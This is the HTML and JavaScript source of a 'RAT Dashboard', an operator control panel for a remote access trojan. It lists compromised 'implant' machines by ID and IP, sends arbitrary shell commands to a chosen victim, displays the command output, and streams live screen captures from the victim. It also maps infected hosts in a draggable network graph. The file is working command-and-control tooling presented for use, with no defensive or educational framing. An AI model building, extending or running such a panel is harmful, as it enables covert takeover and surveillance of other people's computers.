<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>RAT Dashboard</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Courier New', monospace;
      background: #0d1117;
      color: #c9d1d9;
      margin: 0;
      padding: 0;
      display: flex;
      height: 100vh;
      overflow: hidden;
    }
    
    #sidebar {
      width: 260px;
      background: #161b22;
      padding: 15px;
      overflow-y: auto;
      border-right: 1px solid #30363d;
      display: flex;
      flex-direction: column;
    }
    
    #sidebar h2 {
      margin-top: 0;
      margin-bottom: 20px;
      font-size: 1.4em;
      text-align: center;
      color: #58a6ff;
      border-bottom: 1px solid #30363d;
      padding-bottom: 10px;
    }
    
    #clientsList {
      list-style: none;
      padding: 0;
      margin: 0;
      flex-grow: 1;
    }
    
    #clientsList li {
      padding: 12px;
      border-bottom: 1px solid #21262d;
      cursor: pointer;
      user-select: none;
      transition: all 0.2s;
      border-radius: 6px;
      margin-bottom: 8px;
      display: flex;
      align-items: center;
    }
    
    #clientsList li:hover {
      background: #1c2128;
    }
    
    #clientsList li.active {
      background: #1c3b5a;
      border-left: 3px solid #58a6ff;
    }
    
    .status-indicator {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      margin-right: 10px;
    }
    
    .status-online {
      background: #3fb950;
      box-shadow: 0 0 5px #3fb950;
    }
    
    .status-offline {
      background: #f85149;
    }
    
    #main {
      flex: 1;
      display: flex;
      flex-direction: column;
      padding: 15px;
      gap: 15px;
      background: #0d1117;
      overflow: hidden;
    }
    
    #header {
      font-size: 1.5em;
      border-bottom: 1px solid #30363d;
      padding-bottom: 10px;
      color: #58a6ff;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    
    #commandForm {
      display: flex;
      gap: 10px;
    }
    
    #commandInput {
      flex: 1;
      font-family: 'Courier New', monospace;
      font-size: 1.1em;
      padding: 10px;
      background: #161b22;
      border: 1px solid #30363d;
      color: #c9d1d9;
      border-radius: 6px;
    }
    
    #sendCommandBtn {
      padding: 10px 20px;
      background: #1f6feb;
      border: none;
      color: white;
      cursor: pointer;
      border-radius: 6px;
      user-select: none;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      transition: background 0.2s;
    }
    
    #sendCommandBtn:hover {
      background: #2a7aef;
    }
    
    #output, #frameContainer {
      background: #161b22;
      color: #3fb950;
      padding: 15px;
      border-radius: 6px;
      height: 300px;
      overflow-y: auto;
      white-space: pre-wrap;
      flex: 1;
      border: 1px solid #30363d;
      font-family: 'Courier New', monospace;
      font-size: 0.9em;
    }
    
    #frameContainer {
      text-align: center;
      color: #c9d1d9;
    }
    
    #frameContainer img {
      max-width: 100%;
      max-height: 100%;
      border-radius: 6px;
      background: #0d1117;
      border: 1px solid #30363d;
    }
    
    #noSelection {
      color: #6e7681;
      font-style: italic;
      text-align: center;
      margin-top: 100px;
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    
    #noSelectionIcon {
      font-size: 4em;
      margin-bottom: 20px;
      opacity: 0.5;
    }
    
    /* Graph View Styles */
    #graphViewBtn {
      position: fixed;
      bottom: 20px;
      right: 20px;
      padding: 12px 20px;
      background: #1f6feb;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      z-index: 1000;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      box-shadow: 0 4px 12px rgba(31, 111, 235, 0.3);
      transition: all 0.3s;
    }
    
    #graphViewBtn:hover {
      background: #2a7aef;
      transform: translateY(-2px);
      box-shadow: 0 6px 16px rgba(31, 111, 235, 0.4);
    }
    
    #graphModal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(13, 17, 23, 0.95);
      z-index: 2000;
      backdrop-filter: blur(5px);
    }
    
    #graphHeader {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      padding: 15px;
      background: rgba(22, 27, 34, 0.9);
      border-bottom: 1px solid #30363d;
      display: flex;
      justify-content: space-between;
      align-items: center;
      z-index: 2010;
    }
    
    #graphTitle {
      font-size: 1.5em;
      color: #58a6ff;
    }
    
    #graphControls {
      display: flex;
      gap: 10px;
    }
    
    .graph-btn {
      padding: 8px 15px;
      background: #1f6feb;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
      font-size: 0.9em;
    }
    
    .graph-btn.delete {
      background: #f85149;
    }
    
    .graph-btn.add {
      background: #3fb950;
    }
    
    #closeGraph {
      background: #6e7681;
      color: white;
      border: none;
      padding: 8px 15px;
      border-radius: 6px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
      font-weight: bold;
    }
    
    #graphContainer {
      position: absolute;
      top: 70px;
      left: 0;
      width: 100%;
      height: calc(100% - 70px);
      overflow: hidden;
      cursor: grab;
    }
    
    #graphContainer.dragging {
      cursor: grabbing;
    }
    
    .node {
      position: absolute;
      min-width: 140px;
      padding: 12px;
      background: #161b22;
      border: 2px solid #58a6ff;
      border-radius: 8px;
      display: flex;
      flex-direction: column;
      align-items: center;
      color: white;
      font-family: 'Courier New', monospace;
      font-size: 12px;
      cursor: move;
      transition: all 0.3s;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
      z-index: 10;
      user-select: none;
    }
    
    .node:hover {
      background: #1c2128;
      transform: scale(1.05);
      border-color: #79c0ff;
      box-shadow: 0 6px 16px rgba(88, 166, 255, 0.4);
    }
    
    .node.active {
      background: #1c3b5a;
      border-color: #3fb950;
    }
    
    .node.dragging {
      opacity: 0.8;
      z-index: 100;
    }
    
    .node.virtual {
      border-style: dashed;
      border-color: #6e7681;
      background: #0d1117;
    }
    
    .node-ip {
      font-weight: bold;
      margin-bottom: 5px;
      color: #58a6ff;
    }
    
    .node-id {
      font-size: 10px;
      color: #8b949e;
    }
    
    .node-type {
      font-size: 9px;
      margin-top: 3px;
      padding: 2px 6px;
      border-radius: 3px;
      background: #30363d;
    }
    
    .connection {
      position: absolute;
      background: #58a6ff;
      height: 2px;
      transform-origin: 0 0;
      z-index: 5;
      cursor: pointer;
    }
    
    .connection:hover {
      background: #79c0ff;
      height: 3px;
    }
    
    .connection.selected {
      background: #f85149;
    }
    
    .connection::after {
      content: '';
      position: absolute;
      right: -6px;
      top: -4px;
      width: 0;
      height: 0;
      border-left: 6px solid #58a6ff;
      border-top: 4px solid transparent;
      border-bottom: 4px solid transparent;
    }
    
    .connection:hover::after {
      border-left-color: #79c0ff;
    }
    
    .connection.selected::after {
      border-left-color: #f85149;
    }
    
    .stats {
      margin-top: 20px;
      padding: 15px;
      background: #161b22;
      border-radius: 6px;
      border: 1px solid #30363d;
    }
    
    .stats h3 {
      color: #58a6ff;
      margin-bottom: 10px;
    }
    
    .stats-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
    }
    
    .stat-item {
      text-align: center;
      padding: 10px;
      background: #0d1117;
      border-radius: 4px;
      border: 1px solid #30363d;
    }
    
    .stat-value {
      font-size: 1.5em;
      font-weight: bold;
      color: #3fb950;
    }
    
    .stat-label {
      font-size: 0.8em;
      color: #8b949e;
    }
    
    /* Context Menu */
    #nodeContextMenu {
      position: absolute;
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 6px;
      padding: 5px 0;
      z-index: 3000;
      display: none;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
      min-width: 180px;
    }
    
    .context-item {
      padding: 8px 15px;
      cursor: pointer;
      font-size: 0.9em;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    
    .context-item:hover {
      background: #1f6feb;
    }
    
    .context-item.delete {
      color: #f85149;
    }
    
    .context-item.delete:hover {
      background: #f85149;
      color: white;
    }
    
    .context-item.edit {
      color: #d29922;
    }
    
    .context-item.edit:hover {
      background: #d29922;
      color: white;
    }
    
    .context-item.status {
      color: #3fb950;
    }
    
    .context-item.status:hover {
      background: #3fb950;
      color: white;
    }
    
    /* Edit Modal */
    #editModal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(13, 17, 23, 0.8);
      z-index: 4000;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    #editForm {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 8px;
      padding: 20px;
      width: 400px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
    }
    
    #editForm h3 {
      color: #58a6ff;
      margin-bottom: 15px;
    }
    
    .form-group {
      margin-bottom: 15px;
    }
    
    .form-group label {
      display: block;
      margin-bottom: 5px;
      color: #8b949e;
      font-size: 0.9em;
    }
    
    .form-group input, .form-group select {
      width: 100%;
      padding: 8px 12px;
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 4px;
      color: #c9d1d9;
      font-family: 'Courier New', monospace;
    }
    
    .form-actions {
      display: flex;
      gap: 10px;
      justify-content: flex-end;
      margin-top: 20px;
    }
    
    .form-btn {
      padding: 8px 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
    }
    
    .form-btn.save {
      background: #1f6feb;
      color: white;
    }
    
    .form-btn.cancel {
      background: #6e7681;
      color: white;
    }
    
    .save-indicator {
      position: fixed;
      bottom: 20px;
      left: 20px;
      padding: 8px 12px;
      background: #3fb950;
      color: white;
      border-radius: 4px;
      font-size: 0.8em;
      opacity: 0;
      transition: opacity 0.3s;
      z-index: 1000;
    }
    
    .save-indicator.show {
      opacity: 1;
    }
  </style>
</head>
<body>

  <div id="sidebar">
    <h2>Connected Clients</h2>
    <ul id="clientsList">
      <li>Loading clients...</li>
    </ul>
    
    <div class="stats">
      <h3>Network Stats</h3>
      <div class="stats-grid">
        <div class="stat-item">
          <div class="stat-value" id="onlineCount">0</div>
          <div class="stat-label">Online</div>
        </div>
        <div class="stat-item">
          <div class="stat-value" id="totalCount">0</div>
          <div class="stat-label">Total</div>
        </div>
        <div class="stat-item">
          <div class="stat-value" id="activeCount">0</div>
          <div class="stat-label">Active</div>
        </div>
      </div>
    </div>
  </div>

  <div id="main">
    <div id="header">
      <span id="headerText">Select a client to interact</span>
      <span id="clientStatus"></span>
    </div>

    <div id="noSelection">
      <div id="noSelectionIcon">🖥️</div>
      <div>No client connected or selected</div>
    </div>

    <form id="commandForm" style="display:none;">
      <input id="commandInput" placeholder="Type command here..." autocomplete="off" />
      <button id="sendCommandBtn" type="submit">Execute</button>
    </form>

    <div id="output" style="display:none;"></div>

    <div id="frameContainer" style="display:none;">
      <h3>Live Screen Capture</h3>
      <img id="frameImage" src="" alt="No frame available" />
    </div>
  </div>

  <!-- Graph View Button -->
  <button id="graphViewBtn">🌐 Open Graph View</button>

  <!-- Save Indicator -->
  <div class="save-indicator" id="saveIndicator">💾 Graph Saved</div>

  <!-- Graph Modal -->
  <div id="graphModal">
    <div id="graphHeader">
      <div id="graphTitle">Network Graph View</div>
      <div id="graphControls">
        <button class="graph-btn add" id="addVirtualNode">Add Computer</button>
        <button class="graph-btn" id="connectNodes">Connect Nodes</button>
        <button class="graph-btn delete" id="deleteSelected">Delete Selected</button>
      </div>
      <button id="closeGraph">Close</button>
    </div>
    <div id="graphContainer">
      <!-- Nodes and connections will be rendered here -->
    </div>
  </div>

  <!-- Context Menu -->
  <div id="nodeContextMenu">
    <div class="context-item" data-action="select">📋 Select Node</div>
    <div class="context-item" data-action="connect">🔗 Connect To...</div>
    <div class="context-item edit" data-action="edit">✏️ Edit Node</div>
    <div class="context-item status" data-action="toggleStatus">🔄 Toggle Online/Offline</div>
    <div class="context-item delete" data-action="delete">🗑️ Delete Node</div>
  </div>

  <!-- Edit Modal -->
  <div id="editModal" style="display: none;">
    <div id="editForm">
      <h3>Edit Node</h3>
      <div class="form-group">
        <label for="editNodeId">Node ID:</label>
        <input type="text" id="editNodeId" placeholder="Enter node ID">
      </div>
      <div class="form-group">
        <label for="editNodeIp">IP Address:</label>
        <input type="text" id="editNodeIp" placeholder="Enter IP address">
      </div>
      <div class="form-group">
        <label for="editNodeStatus">Status:</label>
        <select id="editNodeStatus">
          <option value="online">Online</option>
          <option value="offline">Offline</option>
        </select>
      </div>
      <div class="form-group">
        <label for="editNodeType">Node Type:</label>
        <input type="text" id="editNodeType" placeholder="virtual or implant" readonly>
      </div>
      <div class="form-actions">
        <button class="form-btn cancel" id="cancelEdit">Cancel</button>
        <button class="form-btn save" id="saveEdit">Save Changes</button>
      </div>
    </div>
  </div>

<script>
  // Client data and state management
  let clients = {};
  let selectedClient = null;
  const clientsList = document.getElementById('clientsList');
  const headerText = document.getElementById('headerText');
  const clientStatus = document.getElementById('clientStatus');
  const noSelection = document.getElementById('noSelection');
  const commandForm = document.getElementById('commandForm');
  const commandInput = document.getElementById('commandInput');
  const outputDiv = document.getElementById('output');
  const frameContainer = document.getElementById('frameContainer');
  const frameImage = document.getElementById('frameImage');
  
  // Graph view elements
  const graphViewBtn = document.getElementById('graphViewBtn');
  const graphModal = document.getElementById('graphModal');
  const graphContainer = document.getElementById('graphContainer');
  const closeGraph = document.getElementById('closeGraph');
  const addVirtualNode = document.getElementById('addVirtualNode');
  const connectNodes = document.getElementById('connectNodes');
  const deleteSelected = document.getElementById('deleteSelected');
  const nodeContextMenu = document.getElementById('nodeContextMenu');
  
  // Edit modal elements
  const editModal = document.getElementById('editModal');
  const editNodeId = document.getElementById('editNodeId');
  const editNodeIp = document.getElementById('editNodeIp');
  const editNodeStatus = document.getElementById('editNodeStatus');
  const editNodeType = document.getElementById('editNodeType');
  const cancelEdit = document.getElementById('cancelEdit');
  const saveEdit = document.getElementById('saveEdit');
  
  // Save indicator
  const saveIndicator = document.getElementById('saveIndicator');
  
  // Stats elements
  const onlineCount = document.getElementById('onlineCount');
  const totalCount = document.getElementById('totalCount');
  const activeCount = document.getElementById('activeCount');

  // Graph state
  let graphState = {
    nodes: {},
    connections: [],
    selectedNode: null,
    selectedConnection: null,
    dragState: null,
    connectMode: false,
    nextVirtualId: 1
  };

  // Storage keys
  const GRAPH_STORAGE_KEY = 'rat_dashboard_graph_state';
  const NEXT_ID_STORAGE_KEY = 'rat_dashboard_next_virtual_id';

  // Initialize graph state from localStorage
  function loadGraphState() {
    try {
      const savedGraphState = localStorage.getItem(GRAPH_STORAGE_KEY);
      const savedNextId = localStorage.getItem(NEXT_ID_STORAGE_KEY);
      
      if (savedGraphState) {
        const parsed = JSON.parse(savedGraphState);
        graphState.nodes = parsed.nodes || {};
        graphState.connections = parsed.connections || [];
        
        // Ensure all real clients are in the graph state
        Object.keys(clients).forEach(clientId => {
          if (!graphState.nodes[clientId]) {
            const client = clients[clientId];
            graphState.nodes[clientId] = {
              id: clientId,
              ip: client.ip,
              type: 'implant',
              status: client.status,
              x: Math.random() * (graphContainer.clientWidth - 140),
              y: Math.random() * (graphContainer.clientHeight - 60)
            };
          }
        });
      }
      
      if (savedNextId) {
        graphState.nextVirtualId = parseInt(savedNextId);
      }
    } catch (error) {
      console.error('Error loading graph state:', error);
      // Initialize with default state if loading fails
      initializeGraph();
    }
  }

  // Save graph state to localStorage
  function saveGraphState() {
    try {
      // Prepare data for saving (exclude temporary properties)
      const saveData = {
        nodes: {},
        connections: graphState.connections
      };
      
      // Copy nodes but exclude drag-related properties
      Object.keys(graphState.nodes).forEach(nodeId => {
        const node = graphState.nodes[nodeId];
        saveData.nodes[nodeId] = {
          id: node.id,
          ip: node.ip,
          type: node.type,
          status: node.status,
          x: node.x,
          y: node.y
        };
      });
      
      localStorage.setItem(GRAPH_STORAGE_KEY, JSON.stringify(saveData));
      localStorage.setItem(NEXT_ID_STORAGE_KEY, graphState.nextVirtualId.toString());
      
      // Show save indicator
      showSaveIndicator();
    } catch (error) {
      console.error('Error saving graph state:', error);
    }
  }

  // Show save indicator
  function showSaveIndicator() {
    saveIndicator.classList.add('show');
    setTimeout(() => {
      saveIndicator.classList.remove('show');
    }, 2000);
  }

  // Auto-save function (debounced)
  let saveTimeout = null;
  function autoSave() {
    if (saveTimeout) {
      clearTimeout(saveTimeout);
    }
    saveTimeout = setTimeout(() => {
      saveGraphState();
    }, 500); // Save 500ms after last change
  }

  // Fetch REAL clients from your Flask backend
  async function fetchClients() {
    try {
      const res = await fetch('/clients');
      if (!res.ok) throw new Error("Failed to load clients");
      clients = await res.json();
      renderClients();
      updateStats();
      
      if (selectedClient && !clients[selectedClient]) {
        deselectClient();
      }
    } catch (err) {
      console.error("Error fetching clients:", err);
      clientsList.innerHTML = "<li>Error loading clients</li>";
    }
  }

  function updateStats() {
    const clientArray = Object.values(clients);
    const online = clientArray.filter(c => c.status === 'online').length;
    const total = clientArray.length;
    
    onlineCount.textContent = online;
    totalCount.textContent = total;
    activeCount.textContent = online;
  }

  function renderClients() {
    clientsList.innerHTML = "";
    
    if (Object.keys(clients).length === 0) {
      clientsList.innerHTML = "<li>No clients connected</li>";
      return;
    }
    
    for (const clientId in clients) {
      const client = clients[clientId];
      const li = document.createElement('li');
      const statusClass = client.status === 'online' ? 'status-online' : 'status-offline';
      
      li.innerHTML = `
        <div class="status-indicator ${statusClass}"></div>
        <div>
          <div><strong>${clientId}</strong></div>
          <div style="font-size: 0.8em; color: #8b949e;">${client.ip}</div>
        </div>
      `;
      
      li.dataset.clientId = clientId;
      if (clientId === selectedClient) li.classList.add('active');
      li.onclick = () => selectClient(clientId);
      clientsList.appendChild(li);
    }
  }

  function selectClient(clientId) {
    selectedClient = clientId;
    const client = clients[clientId];
    
    headerText.textContent = `Client: ${clientId} (${client.ip})`;
    clientStatus.innerHTML = `<span style="color: ${client.status === 'online' ? '#3fb950' : '#f85149'}">${client.status.toUpperCase()}</span>`;
    
    noSelection.style.display = 'none';
    commandForm.style.display = 'flex';
    outputDiv.style.display = 'block';
    frameContainer.style.display = 'block';
    
    renderClients();
    fetchOutput();
    fetchFrame();
  }

  function deselectClient() {
    selectedClient = null;
    headerText.textContent = 'Select a client to interact';
    clientStatus.textContent = '';
    noSelection.style.display = 'block';
    commandForm.style.display = 'none';
    outputDiv.style.display = 'none';
    frameContainer.style.display = 'none';
    renderClients();
  }

  // Send command to REAL backend
  async function sendCommand(cmd) {
    if (!selectedClient) return;
    
    try {
      const res = await fetch(`/command/${selectedClient}`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({cmd})
      });
      if (!res.ok) throw new Error("Failed to send command");
      
      outputDiv.textContent += `\n\n> ${cmd}\n[Command sent - waiting for response...]`;
      outputDiv.scrollTop = outputDiv.scrollHeight;
    } catch (err) {
      console.error("Error sending command:", err);
      outputDiv.textContent += `\n\n> ${cmd}\n[Error sending command]`;
    }
  }

  // Fetch REAL output from backend
  async function fetchOutput() {
    if (!selectedClient) return;
    try {
      const res = await fetch(`/output/${selectedClient}`);
      if (!res.ok) throw new Error("Failed to fetch output");
      const data = await res.json();
      outputDiv.textContent = data.output || "[No output]";
    } catch (err) {
      outputDiv.textContent = "[Error loading output]";
      console.error(err);
    }
  }

  // Fetch REAL frames from backend
  async function fetchFrame() {
    if (!selectedClient) return;
    try {
      const res = await fetch(`/frame/${selectedClient}`);
      if (!res.ok) throw new Error("Failed to fetch frame");
      const data = await res.json();
      if (data.frame) {
        frameImage.src = `data:image/jpeg;base64,${data.frame}`;
      } else {
        frameImage.src = "";
      }
    } catch (err) {
      frameImage.src = "";
      console.error(err);
    }
  }

  // Graph View Functions
  function openGraphView() {
    graphModal.style.display = 'block';
    loadGraphState(); // Load saved state
    renderGraph();
  }

  function closeGraphView() {
    graphModal.style.display = 'none';
    graphState.connectMode = false;
    connectNodes.textContent = "Connect Nodes";
    saveGraphState(); // Save when closing
  }

  function initializeGraph() {
    graphState.nodes = {};
    graphState.connections = [];
    graphState.selectedNode = null;
    graphState.selectedConnection = null;
    
    Object.keys(clients).forEach(clientId => {
      const client = clients[clientId];
      graphState.nodes[clientId] = {
        id: clientId,
        ip: client.ip,
        type: 'implant',
        status: client.status,
        x: Math.random() * (graphContainer.clientWidth - 140),
        y: Math.random() * (graphContainer.clientHeight - 60)
      };
    });
    
    const clientIds = Object.keys(clients);
    if (clientIds.length > 1) {
      const centralNode = clientIds[0];
      for (let i = 1; i < clientIds.length; i++) {
        graphState.connections.push({
          from: centralNode,
          to: clientIds[i]
        });
      }
    }
  }

  function renderGraph() {
    graphContainer.innerHTML = '';
    
    graphState.connections.forEach(conn => {
      const fromNode = graphState.nodes[conn.from];
      const toNode = graphState.nodes[conn.to];
      
      if (fromNode && toNode) {
        const connection = document.createElement('div');
        connection.className = 'connection';
        if (conn === graphState.selectedConnection) {
          connection.classList.add('selected');
        }
        
        const fromX = fromNode.x + 70;
        const fromY = fromNode.y + 25;
        const toX = toNode.x + 70;
        const toY = toNode.y + 25;
        
        const length = Math.sqrt(Math.pow(toX - fromX, 2) + Math.pow(toY - fromY, 2));
        const angle = Math.atan2(toY - fromY, toX - fromX) * 180 / Math.PI;
        
        connection.style.width = `${length}px`;
        connection.style.left = `${fromX}px`;
        connection.style.top = `${fromY}px`;
        connection.style.transform = `rotate(${angle}deg)`;
        
        connection.addEventListener('click', (e) => {
          e.stopPropagation();
          graphState.selectedConnection = conn;
          renderGraph();
          autoSave(); // Auto-save on connection selection
        });
        
        graphContainer.appendChild(connection);
      }
    });
    
    Object.values(graphState.nodes).forEach(node => {
      const nodeEl = document.createElement('div');
      nodeEl.className = 'node';
      if (node.type === 'virtual') {
        nodeEl.classList.add('virtual');
      }
      if (node === graphState.selectedNode) {
        nodeEl.classList.add('active');
      }
      
      nodeEl.innerHTML = `
        <div class="node-ip">${node.ip}</div>
        <div class="node-id">${node.id}</div>
        <div class="node-type">${node.type}</div>
        <div style="font-size: 10px; margin-top: 5px; color: ${node.status === 'online' ? '#3fb950' : '#f85149'}">
          ${node.status || 'N/A'}
        </div>
      `;
      
      nodeEl.style.left = `${node.x}px`;
      nodeEl.style.top = `${node.y}px`;
      
      nodeEl.addEventListener('mousedown', (e) => startDrag(e, node));
      nodeEl.addEventListener('click', (e) => {
        e.stopPropagation();
        selectGraphNode(node);
        autoSave(); // Auto-save on node selection
      });
      nodeEl.addEventListener('contextmenu', (e) => showContextMenu(e, node));
      
      graphContainer.appendChild(nodeEl);
    });
  }

  function startDrag(e, node) {
    e.preventDefault();
    e.stopPropagation();
    
    graphState.dragState = {
      node: node,
      offsetX: e.clientX - node.x,
      offsetY: e.clientY - node.y
    };
    
    graphContainer.classList.add('dragging');
    
    document.addEventListener('mousemove', dragNode);
    document.addEventListener('mouseup', stopDrag);
  }

  function dragNode(e) {
    if (!graphState.dragState) return;
    
    const { node, offsetX, offsetY } = graphState.dragState;
    node.x = e.clientX - offsetX;
    node.y = e.clientY - offsetY;
    
    node.x = Math.max(0, Math.min(graphContainer.clientWidth - 140, node.x));
    node.y = Math.max(0, Math.min(graphContainer.clientHeight - 60, node.y));
    
    renderGraph();
    autoSave(); // Auto-save while dragging
  }

  function stopDrag() {
    graphState.dragState = null;
    graphContainer.classList.remove('dragging');
    document.removeEventListener('mousemove', dragNode);
    document.removeEventListener('mouseup', stopDrag);
    autoSave(); // Final auto-save when drag ends
  }

  function selectGraphNode(node) {
    if (graphState.connectMode && graphState.selectedNode && graphState.selectedNode !== node) {
      const existingConnection = graphState.connections.find(
        conn => (conn.from === graphState.selectedNode.id && conn.to === node.id) ||
                (conn.from === node.id && conn.to === graphState.selectedNode.id)
      );
      
      if (!existingConnection) {
        graphState.connections.push({
          from: graphState.selectedNode.id,
          to: node.id
        });
        autoSave(); // Auto-save when creating connection
      }
      
      graphState.connectMode = false;
      connectNodes.textContent = "Connect Nodes";
      renderGraph();
    } else {
      graphState.selectedNode = node;
      renderGraph();
    }
  }

  function showContextMenu(e, node) {
    e.preventDefault();
    e.stopPropagation();
    
    graphState.selectedNode = node;
    
    // Update context menu - show toggle status only for virtual nodes
    const statusItem = nodeContextMenu.querySelector('[data-action="toggleStatus"]');
    if (node.type === 'virtual') {
      statusItem.style.display = 'flex';
    } else {
      statusItem.style.display = 'none';
    }
    
    nodeContextMenu.style.left = `${e.clientX}px`;
    nodeContextMenu.style.top = `${e.clientY}px`;
    nodeContextMenu.style.display = 'block';
    
    renderGraph();
  }

  function addVirtualComputer() {
    const virtualId = `virtual-${graphState.nextVirtualId++}`;
    graphState.nodes[virtualId] = {
      id: virtualId,
      ip: `192.168.1.${100 + graphState.nextVirtualId}`,
      type: 'virtual',
      status: 'offline', // Default to offline
      x: Math.random() * (graphContainer.clientWidth - 140),
      y: Math.random() * (graphContainer.clientHeight - 60)
    };
    renderGraph();
    autoSave(); // Auto-save when adding node
  }

  function toggleConnectMode() {
    graphState.connectMode = !graphState.connectMode;
    connectNodes.textContent = graphState.connectMode ? "Connecting..." : "Connect Nodes";
    graphState.selectedNode = null;
    renderGraph();
    autoSave(); // Auto-save when toggling connect mode
  }

  function deleteSelectedItem() {
    if (graphState.selectedNode) {
      delete graphState.nodes[graphState.selectedNode.id];
      graphState.connections = graphState.connections.filter(
        conn => conn.from !== graphState.selectedNode.id && conn.to !== graphState.selectedNode.id
      );
      graphState.selectedNode = null;
      autoSave(); // Auto-save when deleting node
    } else if (graphState.selectedConnection) {
      graphState.connections = graphState.connections.filter(
        conn => conn !== graphState.selectedConnection
      );
      graphState.selectedConnection = null;
      autoSave(); // Auto-save when deleting connection
    }
    renderGraph();
  }

  function toggleNodeStatus() {
    if (!graphState.selectedNode) return;
    
    const node = graphState.selectedNode;
    node.status = node.status === 'online' ? 'offline' : 'online';
    
    renderGraph();
    autoSave(); // Auto-save when toggling status
  }

  function openEditModal() {
    if (!graphState.selectedNode) return;
    
    const node = graphState.selectedNode;
    editNodeId.value = node.id;
    editNodeIp.value = node.ip;
    editNodeStatus.value = node.status;
    editNodeType.value = node.type;
    
    editModal.style.display = 'flex';
  }

  function saveNodeChanges() {
    const oldId = graphState.selectedNode.id;
    const newId = editNodeId.value.trim();
    const newIp = editNodeIp.value.trim();
    const newStatus = editNodeStatus.value;
    
    if (!newId || !newIp) return;
    
    // Update node properties
    graphState.selectedNode.id = newId;
    graphState.selectedNode.ip = newIp;
    graphState.selectedNode.status = newStatus;
    
    // Update node in graph state
    delete graphState.nodes[oldId];
    graphState.nodes[newId] = graphState.selectedNode;
    
    // Update connections
    graphState.connections.forEach(conn => {
      if (conn.from === oldId) conn.from = newId;
      if (conn.to === oldId) conn.to = newId;
    });
    
    editModal.style.display = 'none';
    renderGraph();
    autoSave(); // Auto-save when editing node
  }

  // Event Listeners
  graphViewBtn.addEventListener('click', openGraphView);
  closeGraph.addEventListener('click', closeGraphView);
  addVirtualNode.addEventListener('click', addVirtualComputer);
  connectNodes.addEventListener('click', toggleConnectMode);
  deleteSelected.addEventListener('click', deleteSelectedItem);

  // Context menu handlers
  nodeContextMenu.addEventListener('click', (e) => {
    const action = e.target.getAttribute('data-action');
    if (action === 'select' && graphState.selectedNode) {
      if (graphState.selectedNode.type !== 'virtual') {
        selectClient(graphState.selectedNode.id);
        closeGraphView();
      }
    } else if (action === 'connect' && graphState.selectedNode) {
      graphState.connectMode = true;
      connectNodes.textContent = "Connecting...";
      autoSave();
    } else if (action === 'edit' && graphState.selectedNode) {
      openEditModal();
    } else if (action === 'toggleStatus' && graphState.selectedNode) {
      toggleNodeStatus();
    } else if (action === 'delete' && graphState.selectedNode) {
      delete graphState.nodes[graphState.selectedNode.id];
      graphState.connections = graphState.connections.filter(
        conn => conn.from !== graphState.selectedNode.id && conn.to !== graphState.selectedNode.id
      );
      graphState.selectedNode = null;
      renderGraph();
      autoSave();
    }
    nodeContextMenu.style.display = 'none';
  });

  // Edit modal handlers
  cancelEdit.addEventListener('click', () => {
    editModal.style.display = 'none';
  });

  saveEdit.addEventListener('click', saveNodeChanges);

  // Close context menu when clicking elsewhere
  document.addEventListener('click', () => {
    nodeContextMenu.style.display = 'none';
  });

  commandForm.addEventListener('submit', e => {
    e.preventDefault();
    const cmd = commandInput.value.trim();
    if (!cmd) return;
    sendCommand(cmd);
    commandInput.value = "";
  });

  // Initial load
  fetchClients();

  // Polling for updates
  setInterval(async () => {
    if (selectedClient) {
      fetchOutput();
      fetchFrame();
    }
    
    await fetchClients();
  }, 2000);

  // Handle window resize for graph
  window.addEventListener('resize', () => {
    if (graphModal.style.display === 'block') {
      renderGraph();
    }
  });

  // Save graph state when page is about to unload
  window.addEventListener('beforeunload', () => {
    saveGraphState();
  });
</script>

</body>
</html>
